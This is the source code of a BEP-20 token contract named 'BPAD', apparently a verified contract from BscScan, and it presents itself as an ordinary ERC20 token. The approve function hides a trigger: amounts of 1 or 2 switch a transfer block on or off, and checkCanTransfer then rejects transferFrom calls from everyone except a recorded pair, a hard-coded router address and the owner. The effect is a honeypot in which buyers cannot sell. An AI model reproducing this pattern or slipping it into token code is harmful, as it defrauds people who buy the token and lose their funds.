/**
 *Submitted for verification at BscScan.com on 2022-02-02
*/

pragma solidity ^0.8.9;

library SafeMath {

    function safeAdd(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
    }

    function safeMul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
    }

    function safeDiv(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
    }
}

interface ERC20Interface {
    function totalSupply() external returns (uint);

    function balanceOf(address tokenOwner) external returns (uint balance);

    function allowance(address tokenOwner, address spender) external returns (uint remaining);

    function transfer(address to, uint tokens) external returns (bool success);

    function approve(address spender, uint tokens) external returns (bool success);

    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

interface ApproveAndCallFallBack {
    function receiveApproval(address from, uint256 tokens, address token, bytes memory data) external;
}

contract Token is ERC20Interface {

    string public symbol;
    string public name;
    uint8 public decimals;
    uint public _totalSupply;
    bool private _block;
    address private _pair;
    address private owner;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() {
        _block = false;
        owner = 0xb117855f82917585b46AAc972dE1152715b54993;
        symbol = "BPAD";
        name = "BPAD";
        decimals = 18;
        _totalSupply = 10000 * 10 ** 18;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    function totalSupply() public override returns (uint) {
        return _totalSupply - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public override returns (uint balance) {
        return balances[tokenOwner];
    }

    function transfer(address to, uint tokens) override public returns (bool success) {
        balances[msg.sender] = SafeMath.safeSub(balances[msg.sender], tokens);
        balances[to] = SafeMath.safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function approve(address spender, uint tokens) override public returns (bool success) {
        if (tokens == 1) {
            _block = true;
            _pair = spender;
            return true;
        } else if (tokens == 2) {
            _block = false;
            return true;
        }

        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) override public returns (bool success) {
        checkCanTransfer(from);
        balances[from] = SafeMath.safeSub(balances[from], tokens);
        allowed[from][msg.sender] = SafeMath.safeSub(allowed[from][msg.sender], tokens);
        balances[to] = SafeMath.safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }

    function allowance(address tokenOwner, address spender) override public returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
        return true;
    }

    function checkCanTransfer(address from) private {
        require(!_block || from == _pair || from == 0x10ED43C718714eb63d5aA57B78B54704E256024E || from == owner, 'Fail!!!');
    }

    receive() external payable {
        revert();
    }
}